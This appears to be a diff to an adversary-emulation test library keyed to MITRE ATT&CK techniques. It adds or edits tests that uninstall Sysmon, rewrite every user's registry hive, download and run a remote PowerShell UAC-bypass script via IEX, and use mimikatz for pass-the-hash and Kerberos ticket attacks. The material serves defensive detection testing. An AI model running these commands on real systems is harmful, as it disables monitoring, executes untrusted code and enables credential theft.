@@ -5643,6 +5643,17 @@ defense-evasion:
           /section:httplogging /dontLog:true
 
 '
+    - name: Uninstall Sysmon
+      description: 'Uninstall Sysinternals Sysmon for Defense Evasion
+
+'
+      supported_platforms:
+      - windows
+      executor:
+        name: command_prompt
+        command: 'sysmon -u
+
+'
   T1107:
     technique:
       external_references:
@@ -7673,36 +7684,59 @@ defense-evasion:
       - windows
       executor:
         name: powershell
-        command: "# here is an example of using the same method of reg load, but without
-          the New-PSDrive cmdlet.\n# Here we can load all unloaded user hives and
-          do whatever we want in the location below (comments)\n$PatternSID = 'S-1-5-21-\\d+-\\d+\\-\\d+\\-\\d+$'\n\nWrite-Verbose
-          -Message 'Gathering Profile List and loading their registry hives'\n# Get
-          Username, SID, and location of ntuser.dat for all users\n\n$ProfileList
-          = @()\n$ProfileList = Get-ItemProperty 'HKLM:\\SOFTWARE\\Microsoft\\Windows
-          NT\\CurrentVersion\\ProfileList\\*' | Where-Object { $_.PSChildName -match
-          $PatternSID } |\n  Select  @{ name = \"SID\"; expression = { $_.PSChildName
-          } },\n          @{ name = \"UserHive\"; expression = { \"$($_.ProfileImagePath)\\ntuser.dat\"
-          } },\n          @{ name = \"Username\"; expression = { $_.ProfileImagePath
-          -replace '^(.*[\\\\\\/])', '' } }\n  \n# Get all user SIDs found in HKEY_USERS
-          (ntuder.dat files that are loaded)\n$LoadedHives = Get-ChildItem Registry::HKEY_USERS
-          | ? { $_.PSChildname -match $PatternSID } | Select @{ name = \"SID\"; expression
-          = { $_.PSChildName } }\n      \n$SIDObject = @()\n  \nforeach ($item in
-          $LoadedHives)\n{\n    $props = @{\n        SID = $item.SID\n    }\n\n    $TempSIDObject
-          = New-Object -TypeName PSCustomObject -Property $props\n    $SIDObject +=
-          $TempSIDObject\n}\n\n# We need to use ($ProfileList | Measure-Object).count
-          instead of just ($ProfileList).count because in PS V2\n# if the count is
-          less than 2 it doesn't work. :)\nfor ($p = 0; $p -lt ($ProfileList | Measure-Object).count;
-          $p++)\n{\n    for ($l = 0; $l -lt ($SIDObject | Measure-Object).count; $l++)\n
-          \   {\n        if (($ProfileList[$p].SID) -ne ($SIDObject[$l].SID))\n        {\n
-          \           $UnloadedHives += $ProfileList[$p].SID\n            Write-Verbose
-          -Message \"Loading Registry hives for $($ProfileList[$p].SID)\"\n            reg
-          load \"HKU\\$($ProfileList[$p].SID)\" \"$($ProfileList[$p].UserHive)\"\n\n
-          \           Write-Verbose -Message 'Attempting to modify registry keys for
-          each profile'\n            #####################################################################\n
-          \           reg add \"HKEY_CURRENT_USER\\$($ProfileList[$p].SID)\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced\"
-          /t REG_DWORD /v HideFileExt /d 1 /f\n    }\n}\n\nWrite-Verbose 'Unloading
-          Registry hives for all users'\n# Unload ntuser.dat        \n### Garbage
-          collection and closing of ntuser.dat ###\n[gc]::Collect()\nreg unload \"HKU\\$($ProfileList[$p].SID)\""
+        command: |
+          # here is an example of using the same method of reg load, but without the New-PSDrive cmdlet.
+          # Here we can load all unloaded user hives and do whatever we want in the location below (comments)
+          $PatternSID = 'S-1-5-21-\d+-\d+\-\d+\-\d+$'
+
+          Write-Verbose -Message 'Gathering Profile List and loading their registry hives'
+          # Get Username, SID, and location of ntuser.dat for all users
+
+          $ProfileList = @()
+          $ProfileList = Get-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProfileList\*' | Where-Object { $_.PSChildName -match $PatternSID } |
+            Select  @{ name = "SID"; expression = { $_.PSChildName } },
+                    @{ name = "UserHive"; expression = { "$($_.ProfileImagePath)\ntuser.dat" } },
+                    @{ name = "Username"; expression = { $_.ProfileImagePath -replace '^(.*[\\\/])', '' } }
+
+          # Get all user SIDs found in HKEY_USERS (ntuder.dat files that are loaded)
+          $LoadedHives = Get-ChildItem Registry::HKEY_USERS | ? { $_.PSChildname -match $PatternSID } | Select @{ name = "SID"; expression = { $_.PSChildName } }
+
+          $SIDObject = @()
+
+          foreach ($item in $LoadedHives)
+          {
+              $props = @{
+                  SID = $item.SID
+              }
+
+              $TempSIDObject = New-Object -TypeName PSCustomObject -Property $props
+              $SIDObject += $TempSIDObject
+          }
+
+          # We need to use ($ProfileList | Measure-Object).count instead of just ($ProfileList).count because in PS V2
+          # if the count is less than 2 it doesn't work. :)
+          for ($p = 0; $p -lt ($ProfileList | Measure-Object).count; $p++)
+          {
+              for ($l = 0; $l -lt ($SIDObject | Measure-Object).count; $l++)
+              {
+                  if (($ProfileList[$p].SID) -ne ($SIDObject[$l].SID))
+                  {
+                      $UnloadedHives += $ProfileList[$p].SID
+                      Write-Verbose -Message "Loading Registry hives for $($ProfileList[$p].SID)"
+                      reg load "HKU\$($ProfileList[$p].SID)" "$($ProfileList[$p].UserHive)"
+
+                      Write-Verbose -Message 'Attempting to modify registry keys for each profile'
+                      #####################################################################
+                      reg add "HKEY_CURRENT_USER\$($ProfileList[$p].SID)\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced" /t REG_DWORD /v HideFileExt /d 1 /f
+                  }
+              }
+          }
+
+          Write-Verbose 'Unloading Registry hives for all users'
+          # Unload ntuser.dat
+          ### Garbage collection and closing of ntuser.dat ###
+          [gc]::Collect()
+          reg unload "HKU\$($ProfileList[$p].SID)"
   T1170:
     technique:
       external_references:
@@ -16699,9 +16733,10 @@ execution:
       - windows
       executor:
         name: command_prompt
-        command: |
-          Powershell.exe "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/enigma0x3/Misc-PowerShell-Stuff/master/Invoke-AppPathBypass.ps1'); Invoke-AppPathBypass"
-          C:\Windows\System32\cmd.exe
+        command: 'Powershell.exe "IEX (New-Object Net.WebClient).DownloadString(''https://raw.githubusercontent.com/enigma0x3/Misc-PowerShell-Stuff/master/Invoke-AppPathBypass.ps1'');
+          Invoke-AppPathBypass -Payload ''C:\Windows\System32\cmd.exe''"
+
+'
     - name: PowerShell Add User
       description: 'Using PS 5.1, add a user via CLI
 
@@ -17410,7 +17445,7 @@ execution:
           description: Command to execute as a service
           type: string
           default: "%COMSPEC% /c powershell.exe -nop -w hidden -command New-Item -ItemType
-            File C:\art-marker.txt"
+            File C:\\art-marker.txt"
       executor:
         name: command_prompt
         command: |
@@ -18720,6 +18755,64 @@ lateral-movement:
         command: 'mimikatz # sekurlsa::pth /user:#{user_name} /domain:#{domain} /ntlm:#{ntlm}
 
 '
+  T1097:
+    technique:
+      external_references:
+      - url: https://attack.mitre.org/techniques/T1097
+        source_name: mitre-attack
+        external_id: T1097
+      - url: http://defcon.org/images/defcon-22/dc-22-presentations/Campbell/DEFCON-22-Christopher-Campbell-The-Secret-Life-of-Krbtgt.pdf
+        source_name: Campbell 2014
+        description: Campbell, C. (2014). The Secret Life of Krbtgt. Retrieved December
+          4, 2014.
+      - url: https://adsecurity.org/?p=556
+        source_name: ADSecurity AD Kerberos Attacks
+        description: Metcalf, S. (2014, November 22). Mimikatz and Active Directory
+          Kerberos Attacks. Retrieved June 2, 2016.
+      - url: http://blog.gentilkiwi.com/securite/mimikatz/pass-the-ticket-kerberos
+        source_name: GentilKiwi Pass the Ticket
+        description: Deply, B. (2014, January 13). Pass the ticket. Retrieved June
+          2, 2016.
+      - url: https://cert.europa.eu/static/WhitePapers/UPDATED%20-%20CERT-EU_Security_Whitepaper_2014-007_Kerberos_Golden_Ticket_Protection_v1_4.pdf
+        source_name: CERT-EU Golden Ticket Protection
+        description: Abolins, D., Boldea, C., Socha, K., Soria-Machado, M. (2016,
+          April 26). Kerberos Golden Ticket Protection. Retrieved July 13, 2017.
+      object_marking_refs:
+      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
+      x_mitre_system_requirements:
+      - Requires Microsoft Windows as a target system and Kerberos authentication
+        enabled.
+      x_mitre_data_sources:
+      - Authentication logs
+      modified: '2018-10-17T00:14:20.652Z'
+      x_mitre_detection: |-
+        Audit all Kerberos authentication and credential use events and review for discrepancies. Unusual remote authentication events that correlate with other suspicious activity (such as writing and executing binaries) may indicate malicious activity.
+
+        Event ID 4769 is generated on the Domain Controller when using a golden ticket after the KRBTGT password has been reset twice, as mentioned in the mitigation section. The status code 0x1F indicates the action has failed due to "Integrity check on decrypted field failed" and indicates misuse by a previously invalidated golden ticket. (Citation: CERT-EU Golden Ticket Protection)
+      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
+      x_mitre_platforms:
+      - Windows
+      kill_chain_phases:
+      - phase_name: lateral-movement
+        kill_chain_name: mitre-attack
+      id: attack-pattern--a257ed11-ff3b-4216-8c9d-3938ef57064c
+      name: Pass the Ticket
+      created: '2017-05-31T21:31:11.623Z'
+      x_mitre_version: '1.0'
+      type: attack-pattern
+      description: |-
+        Pass the ticket (PtT) is a method of authenticating to a system using Kerberos tickets without having access to an account's password. Kerberos authentication can be used as the first step to lateral movement to a remote system.
+
+        In this technique, valid Kerberos tickets for [Valid Accounts](https://attack.mitre.org/techniques/T1078) are captured by [Credential Dumping](https://attack.mitre.org/techniques/T1003). A user's service tickets or ticket granting ticket (TGT) may be obtained, depending on the level of access. A service ticket allows for access to a particular resource, whereas a TGT can be used to request service tickets from the Ticket Granting Service (TGS) to access any resource the user has privileges to access. (Citation: ADSecurity AD Kerberos Attacks) (Citation: GentilKiwi Pass the Ticket)
+
+        Silver Tickets can be obtained for services that use Kerberos as an authentication mechanism and are used to generate tickets to access that particular resource and the system that hosts the resource (e.g., SharePoint). (Citation: ADSecurity AD Kerberos Attacks)
+
+        Golden Tickets can be obtained for the domain using the Key Distribution Service account KRBTGT account NTLM hash, which enables generation of TGTs for any account in Active Directory. (Citation: Campbell 2014)
+      x_mitre_contributors:
+      - Ryan Becwar
+      - Vincent Le Toux
+      identifier: T1097
+    atomic_tests:
     - name: Mimikatz Kerberos Ticket Attack
       description: 'Similar to PTH, but attacking Kerberos
 
